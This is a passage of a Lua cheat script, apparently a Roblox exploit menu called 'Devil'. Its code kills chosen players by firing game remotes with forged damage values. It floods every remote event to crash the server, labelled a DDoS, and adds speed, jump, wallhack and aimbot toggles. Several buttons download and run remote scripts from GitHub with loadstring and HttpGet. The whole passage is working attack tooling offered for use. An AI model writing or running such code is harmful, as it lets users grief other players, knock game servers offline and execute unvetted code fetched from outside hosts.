    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if obj.Name ~= "UpdateCurrentCall" then
                table.insert(allRemotes, obj)
            end
        end
    end
    return allRemotes
end

local function tryKillWithRemote(targetPlayer, remote)
    if not remote or not remote.Parent then return false end
    
    local args = {
        [1] = targetPlayer,
        [2] = targetPlayer.Character.Humanoid,
        [3] = 9999,
        [4] = player.Character.HumanoidRootPart.Position,
        [5] = targetPlayer.Character.HumanoidRootPart.Position,
        [6] = "damage",
        [7] = workspace,
        [8] = Vector3.new(0,0,0),
        [9] = 100,
        [10] = true
    }
    
    local success = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(unpack(args))
        else
            remote:InvokeServer(unpack(args))
        end
    end)
    
    return success
end

local function killPlayer(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then
        updateStatus("Target not found", true)
        return
    end
    
    local damageEvents = {}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nameLower = obj.Name:lower()
            if nameLower:find("damage") or nameLower:find("hit") or nameLower:find("attack") or nameLower:find("bullet") or nameLower:find("melee") or nameLower:find("RemoteEvent") then
                table.insert(damageEvents, obj)
            end
        end
    end
    
    updateStatus("Found " .. #damageEvents .. " damage events...")
    
    local killed = false
    
    for i, remote in ipairs(damageEvents) do
        if remote and remote.Parent then
            local success = tryKillWithRemote(targetPlayer, remote)
            if success then
                killed = true
                updateStatus(targetPlayer.Name .. " killed with: " .. remote.Name)
                break
            end
        end
        if i % 5 == 0 then
            task.wait(0.05)
        end
    end
    
    if not killed then
        local character = targetPlayer.Character
        local humanoid = character:FindFirstChild("Humanoid")
        
        if humanoid then
            local success = pcall(function()
                humanoid:Destroy()
            end)
            
            if success then
                updateStatus(targetPlayer.Name .. " killed (client)")
            else
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.CFrame = CFrame.new(0, -500, 0)
                    updateStatus(targetPlayer.Name .. " teleported to void")
                end
            end
        end
    end
end

local function startDDoS()
    if ddosActive then
        ddosActive = false
        for _, thread in pairs(ddosThreads) do
            if thread then
                task.cancel(thread)
            end
        end
        ddosThreads = {}
        DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        updateStatus("Server Crasher stopped")
        return
    end
    
    ddosActive = true
    ddosEndTime = tick() + ddosDuration
    DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    updateStatus("Server Crasher started for " .. ddosDuration .. " seconds")
    
    local remotes = findAllRemotes()
    
    local function attackRemote(remote)
        while ddosActive and tick() < ddosEndTime and remote and remote.Parent do
            local success = pcall(function()
                for i = 1, 50 do
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
                    else
                        remote:InvokeServer({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, i, math.random(), tick())
                    end
                end
            end)
            if not success then
                break
            end
            task.wait(0.01)
        end
    end
    
    for i, remote in pairs(remotes) do
        local thread = task.spawn(function()
            attackRemote(remote)
        end)
        table.insert(ddosThreads, thread)
    end
    
    task.spawn(function()
        while ddosActive and tick() < ddosEndTime do
            local newRemotes = findAllRemotes()
            for i, remote in ipairs(newRemotes) do
                local alreadyRunning = false
                for _, thread in pairs(ddosThreads) do
                end
                if not alreadyRunning then
                    local thread = task.spawn(function()
                        attackRemote(remote)
                    end)
                    table.insert(ddosThreads, thread)
                end
            end
            task.wait(1)
        end
        if ddosActive and tick() >= ddosEndTime then
            ddosActive = false
            for _, thread in pairs(ddosThreads) do
                if thread then
                    task.cancel(thread)
                end
            end
            ddosThreads = {}
            DDoSButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            updateStatus("DDoS finished")
        end
    end)
end

SpeedButton.MouseButton1Click:Connect(function()
    speedEnabled = not speedEnabled
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            if speedEnabled then
                originalSpeed = humanoid.WalkSpeed
                humanoid.WalkSpeed = currentSpeed
                SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                updateStatus("Speed Active (120)")
            else
                humanoid.WalkSpeed = 16
                SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                updateStatus("Speed Disabled")
            end
        end
    end
end)

JumpButton.MouseButton1Click:Connect(function()
    jumpEnabled = not jumpEnabled
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            if jumpEnabled then
                originalJump = humanoid.JumpPower
                humanoid.JumpPower = currentJump
                JumpButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                updateStatus("Jump Active (250)")
            else
                humanoid.JumpPower = 50
                JumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                updateStatus("Jump Disabled")
            end
        end
    end
end)

if isMobile then
    SpeedButton.TouchTap:Connect(function()
        speedEnabled = not speedEnabled
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                if speedEnabled then
                    originalSpeed = humanoid.WalkSpeed
                    humanoid.WalkSpeed = currentSpeed
                    SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                    updateStatus("Speed Active (120)")
                else
                    humanoid.WalkSpeed = 16
                    SpeedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    updateStatus("Speed Disabled")
                end
            end
        end
    end)
    
    JumpButton.TouchTap:Connect(function()
        jumpEnabled = not jumpEnabled
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                if jumpEnabled then
                    originalJump = humanoid.JumpPower
                    humanoid.JumpPower = currentJump
                    JumpButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                    updateStatus("Jump Active (250)")
                else
                    humanoid.JumpPower = 50
                    JumpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    updateStatus("Jump Disabled")
                end
            end
        end
    end)
    
    KillButton.TouchTap:Connect(function()
        showPlayerList(function(selected)
            killPlayer(selected)
        end)
    end)
    
    FlingButton.TouchTap:Connect(function()
        updateStatus("Loading Fling...")
        local success = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
        end)
        if success then
            updateStatus("Fling loaded")
        else
            updateStatus("Fling failed to load", true)
        end
    end)
    
    WallhackButton.TouchTap:Connect(function()
        wallhackEnabled = not wallhackEnabled
        toggleWallhack(wallhackEnabled)
        WallhackButton.BackgroundColor3 = wallhackEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
    end)
    
    AimbotButton.TouchTap:Connect(function()
        aimbotEnabled = not aimbotEnabled
        toggleAimbot(aimbotEnabled)
        AimbotButton.BackgroundColor3 = aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
    end)
    
    AC6Button.TouchTap:Connect(function()
        updateStatus("Loading AC6 Sound...")
        local success = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/Ac6ExploitSource.luau"))()
        end)
        if success then
            updateStatus("AC6 Sound loaded")
        else
            updateStatus("AC6 Sound failed to load", true)
        end
    end)
    
    DDoSButton.TouchTap:Connect(function()
        startDDoS()
    end)
end

KillButton.MouseButton1Click:Connect(function()
    showPlayerList(function(selected)
        killPlayer(selected)
    end)
end)

FlingButton.MouseButton1Click:Connect(function()
    updateStatus("Loading Fling...")
    local success = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
    end)
    if success then
        updateStatus("Fling loaded")
    else
        updateStatus("Fling failed to load", true)
    end
end)

WallhackButton.MouseButton1Click:Connect(function()
    wallhackEnabled = not wallhackEnabled
    toggleWallhack(wallhackEnabled)
    WallhackButton.BackgroundColor3 = wallhackEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
end)

AimbotButton.MouseButton1Click:Connect(function()
    aimbotEnabled = not aimbotEnabled
    toggleAimbot(aimbotEnabled)
    AimbotButton.BackgroundColor3 = aimbotEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(0, 0, 0)
end)

AC6Button.MouseButton1Click:Connect(function()
    updateStatus("Loading AC6 Sound...")
    local success = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/Ac6ExploitSource.luau"))()
    end)
    if success then
        updateStatus("AC6 Sound loaded")
    else
        updateStatus("AC6 Sound failed to load", true)
    end
end)

DDoSButton.MouseButton1Click:Connect(function()
    startDDoS()
end)

createAimbotCircle()
updateStatus("Devil Ready")

userInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    local humanoid = char:WaitForChild("Humanoid")
    if speedEnabled then humanoid.WalkSpeed = currentSpeed end
    if jumpEnabled then humanoid.JumpPower = currentJump end
end)
